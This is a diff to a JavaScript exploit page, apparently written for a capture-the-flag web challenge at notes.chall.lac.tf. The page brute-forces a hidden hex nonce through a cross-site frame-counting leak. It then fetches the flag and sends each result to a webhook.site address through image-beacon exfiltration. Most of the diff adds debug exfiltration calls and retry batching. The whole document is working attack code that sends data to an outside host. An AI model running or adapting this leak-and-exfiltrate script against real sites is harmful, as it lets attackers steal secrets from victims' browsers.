@@ -4,11 +4,11 @@
 <div id="frames"></div>
 <script>
 const CHALL = 'https://notes.chall.lac.tf';
-const WEBHOOK = 'https://webhook.site/fcbfa7b7-f8f2-42d2-9c53-6f33f061d36d'; // <-- REPLACE with your webhook.site URL
+const WH = 'https://webhook.site/fcbfa7b7-f8f2-42d2-9c53-6f33f061d36d';
 const HEX = '0123456789abcdef';
 
 function log(m){ document.getElementById('log').textContent += m + '\n'; }
-function exfil(data){ new Image().src = WEBHOOK + '?d=' + encodeURIComponent(data); }
+function exfil(data){ new Image().src = WH + '?d=' + encodeURIComponent(data); }
 
 function testPrefix(prefix) {
     return new Promise(resolve => {
@@ -17,33 +17,42 @@ function testPrefix(prefix) {
         document.getElementById('frames').appendChild(v);
         let done = false;
         function fin(r) { if(done) return; done = true; v.remove(); resolve(r); }
-        const to = setTimeout(() => fin(false), 8000);
+        const to = setTimeout(() => { exfil('TIMEOUT_' + prefix); fin(false); }, 15000);
 
         v.onload = () => {
             setTimeout(() => {
                 let t = 0;
-                try { t = v.contentWindow.length; } catch(e) { clearTimeout(to); fin(false); return; }
+                try { t = v.contentWindow.length; } catch(e) {
+                    exfil('ERR_len_' + prefix + '_' + e.message.substring(0,30));
+                    clearTimeout(to); fin(false); return;
+                }
+
                 if (t === 0) {
                     setTimeout(() => {
                         try { t = v.contentWindow.length; } catch(e) {}
+                        if (t === 0) {
+                            exfil('ZERO_frames_' + prefix);
+                            clearTimeout(to); fin(false); return;
+                        }
                         nav(t);
-                    }, 500);
+                    }, 1000);
                 } else nav(t);
 
                 function nav(total) {
+                    let navOK = 0, navErr = 0;
                     for (let i = 0; i < total; i++) {
-                        try { v.contentWindow.frames[i].location = 'about:blank'; } catch(e) {}
+                        try { v.contentWindow.frames[i].location = 'about:blank'; navOK++; } catch(e) { navErr++; }
                     }
                     setTimeout(() => {
-                        let notes = 0;
+                        let accessible = 0, blocked = 0;
                         for (let i = 0; i < total; i++) {
-                            try { v.contentWindow.frames[i].document; } catch(e) { notes++; }
+                            try { v.contentWindow.frames[i].document; accessible++; } catch(e) { blocked++; }
                         }
                         clearTimeout(to);
-                        fin(notes > 0);
-                    }, 500);
+                        fin(blocked > 0);
+                    }, 1000);
                 }
-            }, 200);
+            }, 500);
         };
         v.src = CHALL + '/?sandbox=x&referrerPolicy=allow-scripts%20allow-same-origin&search=' + encodeURIComponent(prefix);
     });
@@ -53,37 +62,75 @@ async function leak() {
     let nonce = '';
     for (let pos = 0; pos < 8; pos++) {
         log('pos ' + pos + '...');
-        const results = await Promise.all(
-            HEX.split('').map(c => testPrefix(nonce + c).then(m => ({char: c, match: m})))
-        );
-        const hits = results.filter(r => r.match);
-        if (hits.length === 1) {
-            nonce += hits[0].char;
-            log('  -> ' + hits[0].char + ' (' + nonce + ')');
-            exfil('pos' + pos + '=' + hits[0].char + '_nonce=' + nonce);
-        } else if (hits.length > 1) {
-            log('  multi: ' + hits.map(h => h.char).join(',') + ' retrying...');
-            for (const h of hits) {
-                if (await testPrefix(nonce + h.char)) {
-                    nonce += h.char;
-                    log('  -> ' + h.char + ' (' + nonce + ')');
-                    exfil('pos' + pos + '=' + h.char + '_nonce=' + nonce);
-                    break;
+        exfil('pos' + pos + '_start');
+
+        // Test 4 at a time to reduce load
+        let found = null;
+        for (let batch = 0; batch < 4 && !found; batch++) {
+            const chars = HEX.substring(batch * 4, batch * 4 + 4).split('');
+            const results = await Promise.all(
+                chars.map(c => testPrefix(nonce + c).then(m => ({char: c, match: m})))
+            );
+            const hits = results.filter(r => r.match);
+            if (hits.length === 1) {
+                found = hits[0].char;
+            } else if (hits.length > 1) {
+                exfil('multi_' + hits.map(h=>h.char).join(''));
+                for (const h of hits) {
+                    if (await testPrefix(nonce + h.char)) { found = h.char; break; }
                 }
             }
-            if (nonce.length <= pos) { log('  retry'); pos--; await new Promise(r => setTimeout(r, 500)); }
+        }
+
+        if (found) {
+            nonce += found;
+            log('  -> ' + found + ' (' + nonce + ')');
+            exfil('found_pos' + pos + '=' + found + '_n=' + nonce);
         } else {
-            log('  no match, retry');
+            exfil('miss_pos' + pos + '_retry');
+            log('  retry');
             pos--;
-            await new Promise(r => setTimeout(r, 500));
+            await new Promise(r => setTimeout(r, 1000));
         }
     }
     return nonce;
 }
 
 (async () => {
-    log('Starting...');
     exfil('started');
+    log('Starting...');
+
+    // Debug: test a single iframe first
+    try {
+        const dbg = document.createElement('iframe');
+        dbg.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+        document.body.appendChild(dbg);
+        dbg.src = CHALL + '/?sandbox=x&referrerPolicy=allow-scripts%20allow-same-origin&search=a';
+        await new Promise(r => { dbg.onload = r; setTimeout(r, 10000); });
+        await new Promise(r => setTimeout(r, 1500));
+        let len = -1;
+        try { len = dbg.contentWindow.length; } catch(e) { exfil('dbg_len_err_' + e.message.substring(0,40)); }
+        exfil('dbg_len=' + len);
+
+        if (len > 0) {
+            // Try navigation
+            let navOK = 0;
+            for (let i = 0; i < len; i++) {
+                try { dbg.contentWindow.frames[i].location = 'about:blank'; navOK++; } catch(e) {}
+            }
+            exfil('dbg_nav=' + navOK + '/' + len);
+            await new Promise(r => setTimeout(r, 1000));
+            let acc = 0, blk = 0;
+            for (let i = 0; i < len; i++) {
+                try { dbg.contentWindow.frames[i].document; acc++; } catch(e) { blk++; }
+            }
+            exfil('dbg_acc=' + acc + '_blk=' + blk);
+        }
+        dbg.remove();
+    } catch(e) {
+        exfil('dbg_err_' + e.message.substring(0, 50));
+    }
+
     const nonce = await leak();
     log('Nonce: ' + nonce);
     exfil('nonce=' + nonce);
@@ -91,11 +138,10 @@ async function leak() {
     try {
         const r = await fetch(CHALL + '/guess?nonce=' + nonce);
         const t = await r.text();
-        log('FLAG: ' + t);
+        log('RESULT: ' + t);
         exfil('flag=' + t);
     } catch(e) {
-        log('Error: ' + e.message);
-        exfil('error=' + e.message);
+        exfil('guess_err=' + e.message.substring(0, 50));
     }
 })();
 </script></body></html>
